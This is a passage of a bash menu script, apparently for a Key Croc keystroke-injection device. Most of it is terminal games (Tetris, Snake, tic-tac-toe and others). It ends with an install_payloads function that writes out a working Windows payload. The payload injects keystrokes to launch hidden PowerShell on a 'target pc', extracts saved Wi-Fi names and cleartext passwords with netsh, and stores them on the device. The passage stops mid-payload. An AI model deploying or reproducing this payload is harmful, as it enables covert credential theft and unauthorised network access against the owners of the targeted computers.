		# ternary assignment: if help_on is 1 use string as is, otherwise substitute all characters with spaces
		((help_on == 1)) && s="${help[i]}" || s="${help[i]//?/ }"
		xyprint $HELP_X $((HELP_Y + i)) "$s"
}
	((help_on = -help_on))
	reset_colors
}
# this array holds all possible pieces that can be used in the game
# each piece consists of 4 cells
# each string is sequence of relative xy coordinates for different orientations
# depending on piece symmetry there can be 1, 2 or 4 orientations
piece=(
"00011011"                         # square piece
"0212223210111213"                 # line piece
"0001111201101120"                 # S piece
"0102101100101121"                 # Z piece
"01021121101112220111202100101112" # L piece
"01112122101112200001112102101112" # inverted L piece
"01111221101112210110112101101112" # T piece
)
draw_piece() {
# Arguments:
# 1 - x, 2 - y, 3 - type, 4 - rotation, 5 - cell content
	local i x y
# loop through piece cells: 4 cells, each has 2 coordinates
	for ((i = 0; i < 8; i += 2)) {
# relative coordinates are retrieved based on orientation and added to absolute coordinates
		((x = $1 + ${piece[$3]:$((i + $4 * 8 + 1)):1} * 2))
		((y = $2 + ${piece[$3]:$((i + $4 * 8)):1}))
		xyprint $x $y "$5"
}
}
next_piece=0
next_piece_rotation=0
next_piece_color=0
next_on=1 # if this flag is 1 next piece is shown
draw_next() {
# Arguments: 1 - string to draw single cell
	((next_on == -1)) && return
	draw_piece $NEXT_X $NEXT_Y $next_piece $next_piece_rotation "$1"
}
clear_next() {
	draw_next "${filled_cell//?/ }"
}
show_next() {
	set_fg $next_piece_color
	set_bg $next_piece_color
	draw_next "${filled_cell}"
	reset_colors
}
toggle_next() {
	case $next_on in
		1) clear_next; next_on=-1 ;;
		-1) next_on=1; show_next ;;
	esac
}
draw_current() {
# Arguments: 1 - string to draw single cell
# factor 2 for x because each cell is 2 characters wide
	draw_piece $((current_piece_x * 2 + PLAYFIELD_X)) $((current_piece_y + PLAYFIELD_Y)) $current_piece $current_piece_rotation "$1"
}
show_current() {
	set_fg $current_piece_color
	set_bg $current_piece_color
	draw_current "${filled_cell}"
	reset_colors
}
clear_current() {
	draw_current "${empty_cell}"
}
new_piece_location_ok() {
# Arguments: 1 - new x coordinate of the piece, 2 - new y coordinate of the piece
# test if piece can be moved to new location
	local j i x y x_test=$1 y_test=$2
	for ((j = 0, i = 1; j < 8; j += 2, i = j + 1)) {
		((y = ${piece[$current_piece]:$((j + current_piece_rotation * 8)):1} + y_test)) # new y coordinate of piece cell
		((x = ${piece[$current_piece]:$((i + current_piece_rotation * 8)):1} + x_test)) # new x coordinate of piece cell
		((y < 0 || y >= PLAYFIELD_H || x < 0 || x >= PLAYFIELD_W )) && return 1         # check if we are out of the play field
		((${play_field[y * PLAYFIELD_W + x]} != -1 )) && return 1                       # check if location is already ocupied
}
	return 0
}
get_random_next() {
# next piece becomes current
	current_piece=$next_piece
	current_piece_rotation=$next_piece_rotation
	current_piece_color=$next_piece_color
# place current at the top of play field, approximately at the center
	((current_piece_x = (PLAYFIELD_W - 4) / 2))
	((current_piece_y = 0))
# check if piece can be placed at this location, if not - game over
	new_piece_location_ok $current_piece_x $current_piece_y || cmd_quit
	show_current
	clear_next
# now let's get next piece
	((next_piece = RANDOM % ${#piece[@]}))
	((next_piece_rotation = RANDOM % (${#piece[$next_piece]} / 8)))
	((next_piece_color = RANDOM % ${#colors[@]}))
	show_next
}
draw_border() {
	local i x1 x2 y
	set_bold
	set_fg $BORDER_COLOR
	((x1 = PLAYFIELD_X - 2))               # 2 here is because border is 2 characters thick
	((x2 = PLAYFIELD_X + PLAYFIELD_W * 2)) # 2 here is because each cell on play field is 2 characters wide
	for ((i = 0; i < PLAYFIELD_H + 1; i++)) {
		((y = i + PLAYFIELD_Y))
		xyprint $x1 $y "<|"
		xyprint $x2 $y "|>"
}
	((y = PLAYFIELD_Y + PLAYFIELD_H))
	for ((i = 0; i < PLAYFIELD_W; i++)) {
		((x1 = i * 2 + PLAYFIELD_X)) # 2 here is because each cell on play field is 2 characters wide
		xyprint $x1 $y '=='
		xyprint $x1 $((y + 1)) "\/"
}
	reset_colors
}
toggle_color() {
	$no_color && no_color=false || no_color=true
	show_next
	update_score 0
	toggle_help
	toggle_help
	draw_border
	redraw_playfield
	show_current
}
init() {
	local i x1 x2 y
# playfield is initialized with -1s (empty cells)
	for ((i = 0; i < PLAYFIELD_H * PLAYFIELD_W; i++)) {
	play_field[$i]=-1
}
	clear
	hide_cursor
	get_random_next
	get_random_next
	toggle_color
}
# this function runs in separate process
# it sends DOWN commands to controller with appropriate delay
ticker() {
# on SIGUSR2 this process should exit
	trap exit SIGUSR2
# on SIGUSR1 delay should be decreased, this happens during level ups
	trap 'DELAY=$(awk "BEGIN {print $DELAY * $DELAY_FACTOR}")' SIGUSR1
	while true ; do echo -n $DOWN; sleep $DELAY; done
}
# this function processes keyboard input
reader() {
	trap exit SIGUSR2 # this process exits on SIGUSR2
	trap '' SIGUSR1   # SIGUSR1 is ignored
	local -u key a='' b='' cmd esc_ch=$'\x1b'
# commands is associative array, which maps pressed keys to commands, sent to controller
	declare -A commands=([A]=$ROTATE [C]=$RIGHT [D]=$LEFT
		[_S]=$ROTATE [_A]=$LEFT [_D]=$RIGHT
		[_]=$DROP [_Q]=$QUIT [_H]=$TOGGLE_HELP [_N]=$TOGGLE_NEXT [_C]=$TOGGLE_COLOR)
	while read -s -n 1 key ; do
		case "$a$b$key" in
			"${esc_ch}["[ACD]) cmd=${commands[$key]} ;; # cursor key
			*${esc_ch}${esc_ch}) cmd=$QUIT ;;           # exit on 2 escapes
			*) cmd=${commands[_$key]:-} ;;              # regular key. If space was pressed $key is empty
		esac
		a=$b   # preserve previous keys
		b=$key
		[ -n "$cmd" ] && echo -n "$cmd"
	done
}
# this function updates occupied cells in play_field array after piece is dropped
flatten_playfield() {
	local i j k x y
	for ((i = 0, j = 1; i < 8; i += 2, j += 2)) {
		((y = ${piece[$current_piece]:$((i + current_piece_rotation * 8)):1} + current_piece_y))
		((x = ${piece[$current_piece]:$((j + current_piece_rotation * 8)):1} + current_piece_x))
		((k = y * PLAYFIELD_W + x))
		play_field[$k]=$current_piece_color
}
}
# this function goes through play_field array and eliminates lines without empty sells
process_complete_lines() {
	local j i complete_lines
	((complete_lines = 0))
	for ((j = 0; j < PLAYFIELD_W * PLAYFIELD_H; j += PLAYFIELD_W)) {
	for ((i = j + PLAYFIELD_W - 1; i >= j; i--)) {
		((${play_field[$i]} == -1)) && break # empty cell found
}
		((i >= j)) && continue # previous loop was interrupted because empty cell was found
		((complete_lines++))
# move lines down
		for ((i = j - 1; i >= 0; i--)) {
		play_field[$((i + PLAYFIELD_W))]=${play_field[$i]}
}
# mark cells as free
		for ((i = 0; i < PLAYFIELD_W; i++)) {
		play_field[$i]=-1
 }
}
	return $complete_lines
}
process_fallen_piece() {
	flatten_playfield
	process_complete_lines && return
	update_score $?
	redraw_playfield
}
move_piece() {
# arguments: 1 - new x coordinate, 2 - new y coordinate
# moves the piece to the new location if possible
	if new_piece_location_ok $1 $2 ; then # if new location is ok
		clear_current                     # let's wipe out piece current location
		current_piece_x=$1                # update x ...
		current_piece_y=$2                # ... and y of new location
		show_current                      # and draw piece in new location
		return 0                          # nothing more to do here
	fi                                    # if we could not move piece to new location
	(($2 == current_piece_y)) && return 0 # and this was not horizontal move
	process_fallen_piece                  # let's finalize this piece
	get_random_next                       # and start the new one
	return 1
}
cmd_right() {
	move_piece $((current_piece_x + 1)) $current_piece_y
}
cmd_left() {
	move_piece $((current_piece_x - 1)) $current_piece_y
}
cmd_rotate() {
	local available_rotations old_rotation new_rotation
	available_rotations=$((${#piece[$current_piece]} / 8))            # number of orientations for this piece
	old_rotation=$current_piece_rotation                              # preserve current orientation
	new_rotation=$(((old_rotation + 1) % available_rotations))        # calculate new orientation
	current_piece_rotation=$new_rotation                              # set orientation to new
	if new_piece_location_ok $current_piece_x $current_piece_y ; then # check if new orientation is ok
	current_piece_rotation=$old_rotation                          # if yes - restore old orientation
	clear_current                                                 # clear piece image
	current_piece_rotation=$new_rotation                          # set new orientation
	show_current                                                  # draw piece with new orientation
	else                                                              # if new orientation is not ok
		current_piece_rotation=$old_rotation                          # restore old orientation
	fi
}
cmd_down() {
	move_piece $current_piece_x $((current_piece_y + 1))
}
cmd_drop() {
# move piece all way down
# this is example of do..while loop in bash
# loop body is empty
# loop condition is done at least once
# loop runs until loop condition would return non zero exit code
	while move_piece $current_piece_x $((current_piece_y + 1)) ; do : ; done
}
cmd_quit() {
	showtime=false                               # let's stop controller ...
	pkill -SIGUSR2 -f "/bin/bash $0" # ... send SIGUSR2 to all script instances to stop forked processes ...
	xyprint $GAMEOVER_X $GAMEOVER_Y "Game over!"
	echo -e "$screen_buffer"                     # ... and print final message
}
controller() {
# SIGUSR1 and SIGUSR2 are ignored
	trap '' SIGUSR1 SIGUSR2
	local cmd commands
# initialization of commands array with appropriate functions
	commands[$QUIT]=cmd_quit
	commands[$RIGHT]=cmd_right
	commands[$LEFT]=cmd_left
	commands[$ROTATE]=cmd_rotate
	commands[$DOWN]=cmd_down
	commands[$DROP]=cmd_drop
	commands[$TOGGLE_HELP]=toggle_help
	commands[$TOGGLE_NEXT]=toggle_next
	commands[$TOGGLE_COLOR]=toggle_color
	init
	while $showtime; do           # run while showtime variable is true, it is changed to false in cmd_quit function
	echo -ne "$screen_buffer" # output screen buffer ...
	screen_buffer=""          # ... and reset it
	read -s -n 1 cmd          # read next command from stdout
	${commands[$cmd]}         # run command
	done
}
stty_g=`stty -g` # let's save terminal state
# output of ticker and reader is joined and piped into controller
(
	ticker & # ticker runs as separate process
	reader
)|(
	controller
)
show_cursor
stty $stty_g # let's restore terminal state
}
##
#----Pass time Snake
##
snake_game() {
##############################################################################
#                                                                            #
#   Author : Martin "BruXy" Bruchanov, bruxy at regnet.cz                    #
#   URL    : http://bruxy.regnet.cz                                          #
#   Version: 1.01 (Wed Jan  9 20:04:26 CET 2013)                             #
#                                                                            #
##############################################################################
local MW=$(tput cols)
local MH=$(tput lines)
local MH=$[MH-1] # bottom line is used for info and score
local CONFIG=~/.housenka
local DEFAULT_FOOD_NUMBER=2 # reset after game over in func. new_level
local FOOD_NUMBER=0
local DEATH=0
local SCORE=0
local TIMING=0.1            # delay constant, lower value => faster moves
local C=2                   # game cycle
declare -A FOOD
local _STTY=$(stty -g)      # Save current terminal setup
printf "\e[?25l"      # Turn of cursor 
printf "\e]0;HOUSENKA\007"
stty -echo -icanon
local USER=$(whoami)
local NAME=$(grep $USER /etc/passwd | cut -d : -f 5)
#############
# ANSI data #
#############
local GAME_OVER[0]="\e[1;35m╥┌  ╓─╖ ╥ ╥ ╥─┐ ╥─┐    ╥ ╥ ╥┐  ╥ ┬\e[0m"
local GAME_OVER[1]="\e[0;31m╟┴┐ ║ ║ ║\║ ╟┤  ║      ╟─╢ ╟┴┐ ╨╥┘\e[0m"
local GAME_OVER[2]="\e[1;31m╨ ┴ ╙─╜ ╨ ╨ ╨─┘ ╨─┘    ╨ ╨ ╨ ┴  ╨ \e[0m"
local GAME_OVER[3]="\e[0;32m╥────────────────────────────────╥\e[0m"
local GAME_OVER[4]="\e[1;32m║  Stiskni ENTER pro novou hru!  ║\e[0m"
local GAME_OVER[5]="\e[1;36m╨────────────────────────────────╨\e[0m"
#############
# FUNCTIONS #
#############
function at_exit() {
	printf "\e[?9l"          # Turn off mouse reading
	printf "\e[?12l\e[?25h"  # Turn on cursor
	stty "$_STTY"            # reinitialize terminal settings
	tput sgr0
	clear
}
function get_first() {
# Return: first index of array
	eval echo \${!$1[@]} | cut -d ' ' -f 1
}
function gen_food() {
	local x y food
	for ((i=0; i<$[2*$FOOD_NUMBER]; i++)); do
		x=$[RANDOM % (MW-2) + 2]
		y=$[RANDOM % (MH-2) + 2]
		# check if leaf position is unique
	if [ $(echo ${!FOOD[@]} | tr ' ' '\n' | grep -c "^$y;$x$") -gt 0 ]; then
		: $[i--]
	continue
	fi
	food=$[i & 1] # 0 -- poison, 1 -- leaf
	FOOD["$y;$x"]=$food
	if [ $food -eq 1 ]; then 
		printf "\e[$y;${x}f\e[1;32m♠\e[0m";
	else
		printf "\e[$y;${x}f\e[1;31m♣\e[0m";
	fi
	done
}
function check_food() {
	local first
	# check what was eaten in garden
	if [ "${FOOD["$HY;$HX"]}" == "1" ]; then
		unset FOOD["$HY;$HX"]
		: $[FOOD_NUMBER--] $[SCORE++]
		((FOOD_NUMBER==0)) && return 
	elif [ "${FOOD["$HY;$HX"]}" == "0" ]; then
		DEATH=1
	else
		first=$(get_first HOUSENKA)
		printf "\e[${HOUSENKA[$first]}f "
		unset HOUSENKA[$first]
	fi
	# do not break into wall
	if [ $HY -le 1 ] || [ $HY -ge $MH ] || [ $HX -le 1 ] || [ $HX -ge $MW ]; then
		DEATH=2
	fi
	# check if Housenka does not bite herself
	if [ ! -z "$KEY" -a $C -gt 4 ]; then
		local last
		last=${#HOUSENKA[@]}
		if [ $(echo ${HOUSENKA[@]} | tr ' ' '\n' | \
		head -n $[last-2] | grep -c "^$HY;$HX$") -gt 0 ]; then
		DEATH=3
		fi
	fi
}
function game_over() {
	trap : ALRM # disable interupt
	printf "\a"
	centered_window 34 ${#GAME_OVER[@]} GAME_OVER 
	if [ $SCORE -gt $TOP_SCORE ]; then
		echo $SCORE > $CONFIG
		TOP_SCORE=$SCORE
	fi
	read
	DEATH=0 SCORE=0 DEFAULT_FOOD_NUMBER=2
	new_level
}
function centered_window() {
# $1 width $2 height $3 content
	w=$1 h=$2
	x=$[(MW-w)/2]
	y=$[(MH-h)/2]
	ul=$y";"$x
	bl=$[y+h+1]";"$x
	printf "\e[${ul}f┌"; printf '─%.0s' $(eval echo {1..$w}); printf '┐\n'
	for i in $(eval echo {0..$h}); do 
		printf "\e[$[y+i+1];${x}f│";
		echo -en "$(eval printf \"%s\" \"\${$3[\$i]}\")"
		printf "\e[$[y+i+1];$[x+w+1]f│";
	done
	printf "\e[${bl}f└"; printf '─%.0s' $(eval echo {1..$w}); printf '┘\n'
}
function move() {
	check_food
	if [ $DEATH -gt 0 ]; then game_over; fi
	if [ $FOOD_NUMBER -eq 0 ]; then new_level; fi
	echo -en "\e[$HY;${HX}f\e[1;33;42m☻\e[0m"
	( sleep $TIMING; kill -ALRM $$ ) &
	case "$KEY" in
		A) HY=$[HY-1] ;; # Up
		B) HY=$[HY+1] ;; # Down
		C) HX=$[HX+1] ;; # Right
		D) HX=$[HX-1] ;; # Left
	esac
	HOUSENKA[$C]="$HY;$HX"
	: $[C++]
	game_info
}
function draw_area() {
# draw play area
printf "\e[31m"
local x y o="█"
for ((x=0;x<=$MW;x++)); do
	printf  "\e[1;${x}f$o\e[$MH;${x}f$o"
	sleep 0.005
done
for ((y=0;y<=$MH;y++)); do
	printf "\e[${y};1f$o\e[${y};${MW}f$o"
	sleep 0.01
done
}
function new_level() {
	unset HOUSENKA
	for i in ${!FOOD[@]}; do unset FOOD[$i]; done # erase leaves and poison
	clear
	draw_area
	FOOD_NUMBER=$[DEFAULT_FOOD_NUMBER*=2]
	gen_food
	HX=$[MW/2] HY=$[MH/2]  # start position in the middle of the screen
	# body initialization
	HOUSENKA=([0]="$[HY-2];$HX" [1]="$[HY-1];$HX" [2]="$HY;$HX")
	KEY=''
	C=2
	trap move ALRM
}
function title_screen() {
TITLE="QlpoOTFBWSZTWWMw1D8AAnd//X38AIhAA/24Cg2UCD7H13BVRH9ktkYEBAgAEABQ
BHgAEQBSlBJEQhqaA0ZDQBoA0ABpoBo9Rk0Ghw00wQyGmmRkwgGmgDCaNMmABA0E
KRJCTTIDIAAAAAyBkNDQNNHqHDTTBDIaaZGTCAaaAMJo0yYAEDQ4aaYIZDTTIyYQ
DTQBhNGmTAAgadZFPhSv08GL4IDbz4ctYPMQnUncHF0csCYaeprXNsFiBI3jqAqr
eZINIEZYBM0vKFjDLrT3O9d7u0YdyNmszDTqrCoaow3YRJGmq1mpO9ZAbqoXLRBc
sNPFvNGSbnbbDlhVhwUxhQ2lyXlxhssjLVysN8tVGpyiODkVooK4kzcZBVBBouKq
K4k3RKUuppicgMDWCYG23aU3vWmMOHN8HBjaSTYb43vjg4bTqDizjjW5iojfdt7O
DhnoedhCmSaWgoUq6IyuzGTVFAUs66ujrbwJmIp54zi8U0Jvl2dG7jlOcZy0IU8Q
HY32Ojyejm45lswDjSi5KwUwUUlAIQ01SRKUtKU1Hjwg4A7BIMFZ3MMYMQHc2nHg
Fi88aPlyBeYkZTTyRgUml+nl5p3CxSMeGHDUCBTstZpOZckIU8f7lIckxlKZ53hT
YzK0p+YzytGd2hNg2ZCrUpkv09fqowZ9vLuiQCDnIRUPoBDAIVRIZkQO0AKOpQ0o
msRVHATFQU7vc7/1AfWSlJFEkFIrRKQUlVRCSlVNUlLQDMCxBAlAlIkEQTMFMkTM
KkKVBJARFVEBD9hI9tR52USwDECnHMMIoyMqxgMsg0BodaBnMaMbCUaR1ZLkoYFR
EgUFAFNBEoxRgYJqQNQg9r4/g7vn+99/Gsj4bVxAAJfFf177dEjRn5b+cAhI82SQ
jRPNoFhdnAMJcvMkDUJEOiRqlRWaGSUhKgJZGIkiEkGS/jv9e9m2vitRmRjm0T38
FrpAS4kkIYQliBkCQnEYYP80AEjqXFAyVSw1tRWIFcZFUcAwaeljJUjJfQ8Ph9X1
Q+3t/mIXWLjCLuLwg1WEYiUo038wzoqSHpSaSOKUde7LhfHRdQzqlxs3rJKmOROc
o6Y6ZDm+THkzMzIdPXzUOo4RVH/xdyRThQkGMw1D8A=="
	SCR=`echo "$TITLE" | base64 -d | bzcat` #unpack main screen
	local i j IFS=$'\n'
	clear
	# center on screen
	for ((j=0;j<$[(MH-25)/2];j++)); do echo; done
	for i in $SCR; do
	for ((j=0;j<$[(MW-63)/2];j++)); do echo -n " "; done
		printf "%s\n" $i
	done
	read
}
function game_info() {
	printf "\e[$[MH+1];0fHráč: $USER (Nejlepší výkon: $TOP_SCORE)"
	printf "\e[$[MH+1];$[MW-12]fSkóre: %5d" $SCORE
}
########
# MAIN #
########
exec 2>/dev/null
trap at_exit ERR EXIT 
if [ -f $CONFIG ]; then
	TOP_SCORE=$(cat $CONFIG)
else
	TOP_SCORE=0
fi
title_screen
new_level
move
while : ; do
	read -rsn3 -d '' PRESS
	KEY=${PRESS:2}
done
}
##
#----Pass time Matrix effect
##
matrix_effect() {
	local N_LINE=$(( $(tput lines) - 1))
	local N_COLUMN=$(tput cols)
get_char() {
	RANDOM_U=$(echo $(( (RANDOM % 9) + 0)))
	RANDOM_D=$(echo $(( (RANDOM % 9) + 0)))
	CHAR_TYPE="\u04"
	printf "%s" "$CHAR_TYPE$RANDOM_D$RANDOM_U"
}
cursor_position() {
	echo "\033[$1;${RANDOM_COLUMN}H"
}
write_char() {
	CHAR=$(get_char)
	print_char $1 $2 $CHAR
}
erase_char() {
	CHAR="\u0020"
	print_char $1 $2 $CHAR
}
print_char() {
	CURSOR=$(cursor_position $1)
	echo -e "$CURSOR$2$3"
}
draw_line() {
	local RANDOM_COLUMN=$[RANDOM%N_COLUMN]
	local RANDOM_LINE_SIZE=$(echo $(( (RANDOM % $N_LINE) + 1)))
	local COLOR="\033[32m"
	local COLOR_HEAD="\033[37m"
	for i in $(seq 1 $N_LINE ); do
		if [ $broken -eq 1 ]; then
			break
		else
			write_char $[i-1] $COLOR
			write_char $i $COLOR_HEAD
			#sleep 0.05
			if [ $i -ge $RANDOM_LINE_SIZE ]; then
				erase_char $[i-RANDOM_LINE_SIZE]
			fi
		fi
	done &
	for i in $(seq $[i-$RANDOM_LINE_SIZE] $N_LINE); do
		if [ $broken -eq 1 ]; then
			break
		else
			erase_char $i
			#sleep 0.05
		fi
	done
}
	tput setab 000
	clear
	local i=1
	reset_broken
	while true; do
		if [ $broken -eq 1 ]; then
			break ; clear
		else
			draw_line
			#sleep 0.3
		fi
	done
}
##
#----Pass time Game of tic-tac-toe
##
tac_toe() {
local cell_w=10
# horizontal line
local line_seg="---------"
local line="  ""$line_seg""|""$line_seg""|""$line_seg"
local reset="\033[0m"
local player_1_str=$green"Human"$reset
local player_2_str=$blue"Computer"$reset
local positions=(- - - - - - - - -)  # initial positions
local player_one=true  # player switch init
local game_finished=false  # is the game finished
local stall=false  # stall - if an invalid or empty move was input
# functions that draws instructions and board based on positions arr
function draw_board() {
	clear
	name=$1[@]  # passing an array as argument
	positions=("${!name}")
# first lines - instructions
	echo -e "\n       Q W E       _|_|_\n        A S D   →   | | \n         Z X C     ‾|‾|‾\n\n"
for (( row_id=1; row_id<=3; row_id++ )); do
# row
	row="  "
	empty_row="  "
for (( col_id=1; col_id<$(($cell_w*3)); col_id++ )); do
# column
# every 10th is a separator
if [[ $(( $col_id%$cell_w )) == 0 ]]; then
	row=$row"|"
	empty_row=$empty_row"|"
else
if [[ $(( $col_id%5 )) == 0 ]]; then  # get the center of the tile
	x=$(($row_id-1))
	y=$((($col_id - 5) / 10))
if [[ $x == 0 ]]; then
	what=${positions[$y]}
elif [[ $x == 1 ]]; then
	what=${positions[(($y+3))]}
else
	what=${positions[(($y+6))]}
fi
# if it's "-", it's empty
if [[ $what == "-" ]]; then what=" "; fi
	if [[ $what == "X" ]]; then  # append to row
		row=$row$green$what$reset
	else
		row=$row$blue$what$reset
	fi
	empty_row=$empty_row" "  # advance empty row
else  # not the center - space
	row=$row" "
	empty_row=$empty_row" "
	fi
fi
done
	echo -e "$empty_row""\n""$row""\n""$empty_row"  # row is three lines high
if [[ $row_id != 3 ]]; then
	echo -e "$line"
fi
done
	echo -e "\n"
}
# function that displays the prompt based on turn, reads the input and advances the game
function read_move() {
	positions_str=$(printf "%s" "${positions[@]}")
	test_position_str $positions_str  # finish the game if all postiions have been taken or a player has won
if [ "$game_finished" = false ]; then
	if [ "$stall" = false ]; then
		if [ "$player_one" = true ]; then
		prompt="Your move, "$player_1_str"?"
		fi
	else
		stall=false
	fi
if [ "$player_one" = true ]; then
	echo -e $prompt
	read -d'' -s -n1 input  # read input
	index=10  # init with nonexistent
case $input in
	q) index=0;; a) index=3;; z) index=6;; w) index=1;; s) index=4;; x) index=7;; e) index=2;; d) index=5;; c) index=8;;
esac
if [ "${positions["$index"]}" == "-" ]; then
	positions["$index"]="X"
	player_one=false
else
	stall=true  # prevent player switch
fi
	else
# computer, choose your position!
	set_next_avail_pos_index "O"
	player_one=true
fi
	init_game  # reinit, because positions persist
fi
}
function init_game() {
	draw_board positions
	read_move
}
function end_game() {
	game_finished=true
	draw_board positions
}
function test_position_str() {
	rows=${1:0:3}" "${1:3:3}" "${1:6:8}
	cols=${1:0:1}${1:3:1}${1:6:1}" "${1:1:1}${1:4:1}${1:7:1}" "${1:2:1}${1:5:1}${1:8:1}
	diagonals=${1:0:1}${1:4:1}${1:8:1}" "${1:2:1}${1:4:1}${1:6:1}
if [[ $rows =~ [X]{3,} || $cols =~ [X]{3,} || $diagonals =~ [X]{3,} ]]; then
	end_game
	echo -e $player_1_str" wins! \n"
	return
fi
if [[ $rows =~ [O]{3,} || $cols =~ [O]{3,} || $diagonals =~ [O]{3,} ]]; then
	end_game
	echo -e $player_2_str" wins! \n"
	return
fi
if [[ ! $positions_str =~ [-] ]]; then
	end_game
	echo -e "End with a "$pink"draw"$reset"\n"
fi
}
# get next available position and set it to value of argument
function set_next_avail_pos_index() {
	available=()
	for (( i = 0; i < ${#positions[@]}; i++ )); do
if [[ ${positions[$i]} == '-' ]]; then
	available+=($i)
fi
done
rand=$(jot -r 1 0 $(( ${#available[@]}-1 )))  # random in range 0 to available_len
positions[${available[$rand]}]=$1
}
init_game
}
##
#----Heads or tails game
##
Heads_Tails() {
	clear
	echo -ne "$(Info_Screen '
-Simple Heads or tails game')\n\n"
read_all [H] HEADS OR [T] TAILS AND PRESS [ENTER]
case $r_a in
	[Hh]) echo -ne "${yellow}You have chosen ${clear}${green}HEADS${clear}\n" ; local user_choice=HEADS ;;
	[Tt]) echo -ne "${yellow}You have chosen ${clear}${green}TAILS${clear}\n" ; local user_choice=TAILS ;;
	*) invalid_entry ; echo -ne "${yellow}Defaulting to HEADS${clear}\n" ; local user_choice=HEADS ;;
esac
local minsteps=6
local maxsteps=10
local frames=('  |  ' ' ( ) ' '( S )')
local sides=(HEADS TAILS)
local side=$(($RANDOM % 2 ))
for (( step = 0; step < maxsteps; step++ )) ; do
	for (( frame = 0; frame < 3; frame++ )) ; do
		if (( frame == 2 )) ; then
			f=${frames[frame]/S/${sides[side]}}
			(( side ^= 1 ))
		else
			f=${frames[frame]/S/${sides[side]}}
			(( side ^= 2 ))
		fi
	echo -ne "\e[3$(( $RANDOM * 6 / 32767 +1 ))m${f}\033[0K\r${clear}"
	if (( frame == 2 && step > minsteps && RANDOM > 16383 )) ; then
		break 2
	fi
	sleep 0.125
	done
done
if [ ${sides[side]} == TAILS ] && [ $user_choice = HEADS ]; then
	echo -ne "\n${green}YOU WIN${clear}${yellow}! COUNT: ${clear}${green}$(( i++ ))${clear}\n"
elif [ ${sides[side]} == HEADS ] && [ $user_choice = TAILS ]; then
	echo -ne "\n${green}YOU WIN${clear}${yellow}! COUNT: ${clear}${green}$(( i++ ))${clear}\n"
else
	echo -ne "\n${red}YOU LOSE${clear} ${yellow}COUNT: ${clear}${green}$(( x++ ))${clear}\n"
fi
read_all PLAY AGAIN Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	Heads_Tails ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; unset i x ;;
*)
	invalid_entry ; Heads_Tails ;;
esac
}
##
#----Pass time Menu
##
MenuTitle PASS TIME GAMES ; MenuColor 19 1 CHESS ; MenuColor 19 2 TETRIS ; MenuColor 19 3 SNAKE ; MenuColor 19 4 MATRIX ; MenuColor 19 5 TIC-TAC-TOE ; MenuColor 19 6 HEADS OR TAILS ; MenuColor 19 7 RETURN TO MAIN MENU ; MenuEnd 22
	case $m_a in
	1) chess_game ; pass_time ;; 2) tetris_game ; pass_time ;; 3) snake_game ; pass_time ;; 4) matrix_effect ; pass_time ;; 5) tac_toe ; pass_time ;; 6) Heads_Tails ; pass_time ;; 7) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; pass_time ;;
	esac
}
##
#----Croc Pot Plus Install payloads
##
function install_payloads() {
	echo -ne "$(Info_Screen '
-Select which Payload to install and/or run from terminal
-For some payloads to work properly will need to
run Croc_Pot_Payload.txt first to get OS detection')\n\n"
echo -ne "${yellow}CURRENTLY INSTALLED PAYLOADS: ${clear}${green}$(ls /root/udisk/payloads | grep ".txt" | wc -l)${clear}\n"
echo -ne "${cyan}$(ls /root/udisk/payloads | grep ".txt")${clear}\n\n"
##
#----Getonline Payload Function
##
get_online_p() {
	clear
	local GETONLINE_WINDOWS=/root/udisk/payloads/Getonline_Windows.txt
	local GETONLINE_LINUX=/root/udisk/payloads/Getonline_Linux.txt
	local GETONLINE_RASPBERRY=/root/udisk/payloads/Getonline_Raspberry.txt
	echo -ne "$(Info_Screen '
-Payload Called GetOnline
-Connect automatically to target pc WIFI (Windows/Linux/Raspberry)
-After install unplug and plug into target pc and type in below
getonline <-- MATCH word for windows
linuxonline <-- MATCH word for Linux
rasponline <-- MATCH word for Raspberry pi
-When done the led will light up green unplug keycroc and plug back in
-The keycroc should now be connected to the target pc wifi')\n\n"
##
#----Getonline Windows payload
##
if [ -e "${GETONLINE_WINDOWS}" ]; then
	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'GETONLINE WINDOWS PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
	echo -ne "\n${LINE}\n" ; cat ${GETONLINE_WINDOWS} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL GETONLINE PAYLOAD FOR WINDOWS Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:           Windows Get online\n# Description:     Get online automatically to target pc wifi\n# Author:          spywill / RootJunky\n# Version:         2.4\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong
#\nMATCH getonline\nLOCK\nrm /root/udisk/tools/Croc_Pot/wifipass.txt\n# --> udisk unmount\nATTACKMODE HID STORAGE\nsleep 5\nLED ATTACK\nQ GUI r\nsleep 1\n# --> Start powershell\nQ STRING \"powershell -NoP -NonI -W Hidden\"\nQ ENTER\nsleep 2\n# --> Place keycroc usb drive into variable
Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"\nQ ENTER\nsleep 2\n# --> Retrieve taget pc SSID and PASSWD save to tools/Croc_Pot/wifipass.txt
Q STRING \"(netsh wlan show networks) | Select-String \\\"\:(.+)\\\$\\\" | % {\\\$name=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{(netsh wlan show profile name=\\\"\\\$name\\\" key=clear)} | Select-String \\\"Key Content\W+\:(.+)\\\$\\\" | % {\\\$pass=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{[PSCustomObject]@{ PROFILE_NAME=\\\$name;PASSWORD=\\\$pass }} | Out-File -Encoding UTF8 \\\"\\\$Croc\\\tools\Croc_Pot\wifipass.txt\\\"\"
Q ENTER\nsleep 2\nQ STRING \"exit\"\nQ ENTER\n# --> Returning to HID Mode\nATTACKMODE HID\nsleep 3\nLED SETUP\n# --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove r end lines in config.txt file\n\$(sed -i 's/\( \)*/\1/g' /root/udisk/tools/Croc_Pot/wifipass.txt)
